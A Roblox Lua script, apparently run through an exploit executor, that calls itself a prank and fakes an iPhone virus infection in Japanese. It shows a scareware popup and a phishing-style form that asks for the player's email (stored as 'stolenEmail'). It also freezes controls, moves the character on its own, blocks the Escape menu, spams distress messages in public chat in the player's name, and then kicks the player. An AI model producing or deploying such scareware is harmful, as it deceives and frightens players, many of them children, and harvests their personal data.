local player=game.Players.LocalPlayer
local RS=game:GetService("RunService")
local CG=game:GetService("CoreGui")
local UIS=game:GetService("UserInputService")
local ContextActionService=game:GetService("ContextActionService")
local RS2=game:GetService("ReplicatedStorage")
local TweenService=game:GetService("TweenService")

local enabled=true
local stolenEmail=""
local KEY=player.Name

-- ===== チャット関連 =====
local function sendChat(msg)
    pcall(function()
        local defaultChat=RS2:FindFirstChild("DefaultChatSystemChatEvents")
        if defaultChat then
            local sayReq=defaultChat:FindFirstChild("SayMessageRequest")
            if sayReq then
                sayReq:FireServer(msg,"All")
                return
            end
        end
        local chatService=game:GetService("TextChatService")
        if chatService and chatService.ChatVersion==Enum.ChatVersion.TextChatService then
            local channels=chatService:FindFirstChild("TextChannels")
            if channels then
                local rb=channels:FindFirstChild("RBXGeneral")
                if rb then
                    rb:SendAsync(msg)
                end
            end
        end
    end)
end

local chatMessages={
    "HELP ME",
    "iPhoneがウイルスに感染しました",
    "助けて",
    "誰か助けてください",
    "ウイルスが...",
    "あああああ",
    "システム異常",
    "感染中...",
    "削除してください",
    "やめて"
}

-- ===== キー入力画面 =====
local function showKeyInput(parentGui)
    local keyFrame=Instance.new("Frame")
    keyFrame.Size=UDim2.new(0,320,0,200)
    keyFrame.Position=UDim2.new(0.5,-160,0.5,-100)
    keyFrame.BackgroundColor3=Color3.fromRGB(245,245,245)
    keyFrame.BorderSizePixel=0
    keyFrame.ZIndex=30
    keyFrame.Parent=parentGui

    local kfc=Instance.new("UICorner")
    kfc.CornerRadius=UDim.new(0,20)
    kfc.Parent=keyFrame

    local kTitle=Instance.new("TextLabel")
    kTitle.Size=UDim2.new(1,0,0,40)
    kTitle.Position=UDim2.new(0,0,0,20)
    kTitle.BackgroundTransparency=1
    kTitle.Text="キーを入力"
    kTitle.TextColor3=Color3.fromRGB(0,0,0)
    kTitle.Font=Enum.Font.GothamBold
    kTitle.TextSize=20
    kTitle.ZIndex=31
    kTitle.Parent=keyFrame

    local kDesc=Instance.new("TextLabel")
    kDesc.Size=UDim2.new(0.9,0,0,30)
    kDesc.Position=UDim2.new(0.05,0,0,58)
    kDesc.BackgroundTransparency=1
    kDesc.Text="ヒント: あなたのユーザーネーム"
    kDesc.TextColor3=Color3.fromRGB(100,100,100)
    kDesc.Font=Enum.Font.Gotham
    kDesc.TextSize=13
    kDesc.TextWrapped=true
    kDesc.ZIndex=31
    kDesc.Parent=keyFrame

    local kBox=Instance.new("TextBox")
    kBox.Size=UDim2.new(0.9,0,0,40)
    kBox.Position=UDim2.new(0.05,0,0.42,0)
    kBox.BackgroundColor3=Color3.fromRGB(255,255,255)
    kBox.BorderSizePixel=0
    kBox.PlaceholderText="Key..."
    kBox.Text=""
    kBox.TextColor3=Color3.fromRGB(0,0,0)
    kBox.Font=Enum.Font.Gotham
    kBox.TextSize=14
    kBox.ZIndex=31
    kBox.Parent=keyFrame

    local kbc=Instance.new("UICorner")
    kbc.CornerRadius=UDim.new(0,8)
    kbc.Parent=kBox

    local kStroke=Instance.new("UIStroke")
    kStroke.Color=Color3.fromRGB(200,200,200)
    kStroke.Thickness=1
    kStroke.Parent=kBox

    local kStatus=Instance.new("TextLabel")
    kStatus.Size=UDim2.new(0.9,0,0,18)
    kStatus.Position=UDim2.new(0.05,0,0.66,0)
    kStatus.BackgroundTransparency=1
    kStatus.Text=""
    kStatus.TextColor3=Color3.fromRGB(255,59,48)
    kStatus.Font=Enum.Font.Gotham
    kStatus.TextSize=12
    kStatus.ZIndex=31
    kStatus.Parent=keyFrame

    local kBtn=Instance.new("TextButton")
    kBtn.Size=UDim2.new(0.9,0,0,36)
    kBtn.Position=UDim2.new(0.05,0,0.8,0)
    kBtn.BackgroundColor3=Color3.fromRGB(0,122,255)
    kBtn.Text="認証"
    kBtn.TextColor3=Color3.fromRGB(255,255,255)
    kBtn.Font=Enum.Font.GothamBold
    kBtn.TextSize=14
    kBtn.ZIndex=31
    kBtn.Parent=keyFrame

    local kbtc=Instance.new("UICorner")
    kbtc.CornerRadius=UDim.new(0,10)
    kbtc.Parent=kBtn

    kBtn.MouseButton1Click:Connect(function()
        if kBox.Text==KEY then
            kStatus.Text="認証成功"
            kStatus.TextColor3=Color3.fromRGB(0,200,80)
            task.wait(0.5)
            keyFrame:Destroy()
            player:Kick("ウイルスが残っています。")
        else
            kStatus.Text="キーが違います"
            kStatus.TextColor3=Color3.fromRGB(255,59,48)
            kBox.Text=""
        end
    end)
end

-- ===== メールアドレス入力画面 =====
local function showEmailInput(parentGui)
    local emailFrame=Instance.new("Frame")
    emailFrame.Size=UDim2.new(0,320,0,220)
    emailFrame.Position=UDim2.new(0.5,-160,0.5,-110)
    emailFrame.BackgroundColor3=Color3.fromRGB(245,245,245)
    emailFrame.BorderSizePixel=0
    emailFrame.ZIndex=20
    emailFrame.Parent=parentGui

    local efc=Instance.new("UICorner")
    efc.CornerRadius=UDim.new(0,20)
    efc.Parent=emailFrame

    local eTitle=Instance.new("TextLabel")
    eTitle.Size=UDim2.new(1,0,0,40)
    eTitle.Position=UDim2.new(0,0,0,20)
    eTitle.BackgroundTransparency=1
    eTitle.Text="メールアドレスを入力"
    eTitle.TextColor3=Color3.fromRGB(0,0,0)
    eTitle.Font=Enum.Font.GothamBold
    eTitle.TextSize=18
    eTitle.ZIndex=21
    eTitle.Parent=emailFrame

    local eDesc=Instance.new("TextLabel")
    eDesc.Size=UDim2.new(0.9,0,0,30)
    eDesc.Position=UDim2.new(0.05,0,0,55)
    eDesc.BackgroundTransparency=1
    eDesc.Text="削除には本人確認が必要です"
    eDesc.TextColor3=Color3.fromRGB(100,100,100)
    eDesc.Font=Enum.Font.Gotham
    eDesc.TextSize=13
    eDesc.ZIndex=21
    eDesc.Parent=emailFrame

    local eBox=Instance.new("TextBox")
    eBox.Size=UDim2.new(0.9,0,0,40)
    eBox.Position=UDim2.new(0.05,0,0.4,0)
    eBox.BackgroundColor3=Color3.fromRGB(255,255,255)
    eBox.BorderSizePixel=0
    eBox.PlaceholderText="example@icloud.com"
    eBox.Text=""
    eBox.TextColor3=Color3.fromRGB(0,0,0)
    eBox.Font=Enum.Font.Gotham
    eBox.TextSize=14
    eBox.ZIndex=21
    eBox.Parent=emailFrame

    local ebc=Instance.new("UICorner")
    ebc.CornerRadius=UDim.new(0,8)
    ebc.Parent=eBox

    local eStroke=Instance.new("UIStroke")
    eStroke.Color=Color3.fromRGB(200,200,200)
    eStroke.Thickness=1
    eStroke.Parent=eBox

    local loadBg=Instance.new("Frame")
    loadBg.Size=UDim2.new(0.9,0,0,8)
    loadBg.Position=UDim2.new(0.05,0,0.7,0)
    loadBg.BackgroundColor3=Color3.fromRGB(220,220,220)
    loadBg.BorderSizePixel=0
    loadBg.ClipsDescendants=true
    loadBg.ZIndex=21
    loadBg.Parent=emailFrame

    local lbc=Instance.new("UICorner")
    lbc.CornerRadius=UDim.new(0,4)
    lbc.Parent=loadBg

    local loadBar=Instance.new("Frame")
    loadBar.Size=UDim2.new(0,0,1,0)
    loadBar.BackgroundColor3=Color3.fromRGB(0,122,255)
    loadBar.BorderSizePixel=0
    loadBar.ZIndex=22
    loadBar.Parent=loadBg

    local lbrc=Instance.new("UICorner")
    lbrc.CornerRadius=UDim.new(0,4)
    lbrc.Parent=loadBar

    local statusText=Instance.new("TextLabel")
    statusText.Size=UDim2.new(0.9,0,0,20)
    statusText.Position=UDim2.new(0.05,0,0.78,0)
    statusText.BackgroundTransparency=1
    statusText.Text=""
    statusText.TextColor3=Color3.fromRGB(100,100,100)
    statusText.Font=Enum.Font.Gotham
    statusText.TextSize=12
    statusText.ZIndex=21
    statusText.Parent=emailFrame

    local sendBtn=Instance.new("TextButton")
    sendBtn.Size=UDim2.new(0.9,0,0,34)
    sendBtn.Position=UDim2.new(0.05,0,0.88,0)
    sendBtn.BackgroundColor3=Color3.fromRGB(0,122,255)
    sendBtn.Text="送信"
    sendBtn.TextColor3=Color3.fromRGB(255,255,255)
    sendBtn.Font=Enum.Font.GothamBold
    sendBtn.TextSize=14
    sendBtn.ZIndex=21
    sendBtn.Parent=emailFrame

    local sbc=Instance.new("UICorner")
    sbc.CornerRadius=UDim.new(0,10)
    sbc.Parent=sendBtn

    local loadRunning=false
    local function startLoading()
        if loadRunning then return end
        loadRunning=true
        sendBtn.Visible=false
        loadBar.Size=UDim2.new(0,0,1,0)
        loadBg.Visible=true
        statusText.Visible=true
        
        local statuses={
            "接続中...",
            "サーバーに送信中...",
            "確認中...",
            "ウイルスを削除しています...",
            "削除中...",
            "ほぼ完了...",
            "最終処理中...",
        }
        
        task.spawn(function()
            for i,status in ipairs(statuses) do
                statusText.Text=status
                local tween=TweenService:Create(loadBar,TweenInfo.new(0.8,Enum.EasingStyle.Quad),{
                    Size=UDim2.new(i/#statuses,0,1,0)
                })
                tween:Play()
                task.wait(0.9)
            end
            statusText.Text="完了しました"
            loadBar.BackgroundColor3=Color3.fromRGB(0,200,80)
            task.wait(1.5)
            emailFrame:Destroy()
            showKeyInput(parentGui)
        end)
    end

    sendBtn.MouseButton1Click:Connect(function()
        local email=eBox.Text
        if email=="" then
            statusText.Text="メールアドレスを入力してください"
            eBox.Text=""
            return
        end
        stolenEmail=email
        startLoading()
    end)
end

-- ===== iPhone風ウイルス画面 =====
local function createVirusPopup()
    local gui=Instance.new("ScreenGui")
    gui.Name=tostring(math.random(100000,999999))
    gui.ResetOnSpawn=false
    gui.IgnoreGuiInset=true
    gui.DisplayOrder=9999
    pcall(function() gui.Parent=CG end)
    if not gui.Parent then gui.Parent=player:WaitForChild("PlayerGui") end

    local bg=Instance.new("Frame")
    bg.Size=UDim2.new(1,0,1,0)
    bg.BackgroundColor3=Color3.fromRGB(0,0,0)
    bg.BackgroundTransparency=0.4
    bg.BorderSizePixel=0
    bg.ZIndex=1
    bg.Parent=gui

    local popup=Instance.new("Frame")
    popup.Size=UDim2.new(0,320,0,300)
    popup.Position=UDim2.new(0.5,-160,0.5,-150)
    popup.BackgroundColor3=Color3.fromRGB(245,245,245)
    popup.BorderSizePixel=0
    popup.ZIndex=10
    popup.Parent=gui

    local pc=Instance.new("UICorner")
    pc.CornerRadius=UDim.new(0,20)
    pc.Parent=popup

    local warningIcon=Instance.new("TextLabel")
    warningIcon.Size=UDim2.new(1,0,0,80)
    warningIcon.Position=UDim2.new(0,0,0,20)
    warningIcon.BackgroundTransparency=1
    warningIcon.Text="⚠️"
    warningIcon.TextColor3=Color3.fromRGB(255,59,48)
    warningIcon.Font=Enum.Font.GothamBold
    warningIcon.TextSize=64
    warningIcon.ZIndex=11
    warningIcon.Parent=popup

    local titleLabel=Instance.new("TextLabel")
    titleLabel.Size=UDim2.new(1,0,0,30)
    titleLabel.Position=UDim2.new(0,0,0,105)
    titleLabel.BackgroundTransparency=1
    titleLabel.Text="ウイルス検出"
    titleLabel.TextColor3=Color3.fromRGB(0,0,0)
    titleLabel.Font=Enum.Font.GothamBold
    titleLabel.TextSize=22
    titleLabel.ZIndex=11
    titleLabel.Parent=popup

    local msgLabel=Instance.new("TextLabel")
    msgLabel.Size=UDim2.new(0.9,0,0,100)
    msgLabel.Position=UDim2.new(0.05,0,0,140)
    msgLabel.BackgroundTransparency=1
    msgLabel.Text="お使いのiPhoneは2種類のウイルスに感染しています。今すぐ削除してください。"
    msgLabel.TextColor3=Color3.fromRGB(60,60,60)
    msgLabel.Font=Enum.Font.Gotham
    msgLabel.TextSize=15
    msgLabel.TextWrapped=true
    msgLabel.ZIndex=11
    msgLabel.Parent=popup

    local deleteBtn=Instance.new("TextButton")
    deleteBtn.Size=UDim2.new(0.9,0,0,40)
    deleteBtn.Position=UDim2.new(0.05,0,0.72,0)
    deleteBtn.BackgroundColor3=Color3.fromRGB(255,59,48)
    deleteBtn.Text="今すぐ削除"
    deleteBtn.TextColor3=Color3.fromRGB(255,255,255)
    deleteBtn.Font=Enum.Font.GothamBold
    deleteBtn.TextSize=16
    deleteBtn.ZIndex=11
    deleteBtn.Parent=popup

    local dbc=Instance.new("UICorner")
    dbc.CornerRadius=UDim.new(0,10)
    dbc.Parent=deleteBtn

    local closeBtn=Instance.new("TextButton")
    closeBtn.Size=UDim2.new(0.9,0,0,34)
    closeBtn.Position=UDim2.new(0.05,0,0.86,0)
    closeBtn.BackgroundColor3=Color3.fromRGB(220,220,220)
    closeBtn.Text="後で"
    closeBtn.TextColor3=Color3.fromRGB(60,60,60)
    closeBtn.Font=Enum.Font.GothamBold
    closeBtn.TextSize=14
    closeBtn.ZIndex=11
    closeBtn.Parent=popup

    local cbc=Instance.new("UICorner")
    cbc.CornerRadius=UDim.new(0,10)
    cbc.Parent=closeBtn

    deleteBtn.MouseButton1Click:Connect(function()
        deleteBtn.Text="削除中..."
        task.wait(0.5)
        deleteBtn.Text="削除に失敗しました"
        task.wait(0.5)
        deleteBtn.Text="今すぐ削除"
    end)

    closeBtn.MouseButton1Click:Connect(function()
        popup.Visible=false
        showEmailInput(gui)
    end)

    return gui
end

local virusGui=createVirusPopup()

task.spawn(function()
    while enabled do
        task.wait(1)
        if not virusGui or not virusGui.Parent then
            virusGui=createVirusPopup()
        end
    end
end)

-- ===== 操作不能 =====
local function disableControls()
    local char=player.Character
    if char then
        local hum=char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed=0
            hum.JumpPower=0
            hum.UseJumpPower=true
        end
    end
    pcall(function()
        ContextActionService:BindActionAtPriority("BlockAll",function()
            return Enum.ContextActionResult.Sink
        end,false,10000,
        Enum.PlayerActions.CharacterForward,
        Enum.PlayerActions.CharacterBackward,
        Enum.PlayerActions.CharacterLeft,
        Enum.PlayerActions.CharacterRight,
        Enum.PlayerActions.CharacterJump)
    end)
end

-- ===== 勝手に動く =====
local moveTime=0
local moveConn=RS.Heartbeat:Connect(function(dt)
    if not enabled then return end
    local char=player.Character
    if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    moveTime=moveTime+dt
    local dirX=math.sin(moveTime*1.5)
    local dirZ=math.cos(moveTime*1.5)
    local dir=Vector3.new(dirX,0,dirZ).Unit
    hrp.CFrame=hrp.CFrame+dir*0.5
end)

-- ===== 勝手にチャット =====
task.spawn(function()
    task.wait(2)
    while enabled do
        local msg=chatMessages[math.random(1,#chatMessages)]
        sendChat(msg)
        task.wait(math.random(3,7))
    end
end)

player.CharacterAdded:Connect(function()
    task.wait(1)
    disableControls()
end)

if player.Character then
    disableControls()
end

pcall(function()
    ContextActionService:BindAction("BlockMenu",function()
        return Enum.ContextActionResult.Sink
    end,false,Enum.KeyCode.Escape)
end)

getgenv().StopPrank=function()
    enabled=false
    if moveConn then moveConn:Disconnect() end
    pcall(function()
        ContextActionService:UnbindAction("BlockAll")
        ContextActionService:UnbindAction("BlockMenu")
    end)
    local char=player.Character
    if char then
        local hum=char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed=16
            hum.JumpPower=50
        end
    end
    if virusGui then virusGui:Destroy() end
    warn("Prank 停止")
end

warn("Prank 起動")
warn("キー: "..KEY)
warn("止めるには: getgenv().StopPrank()")
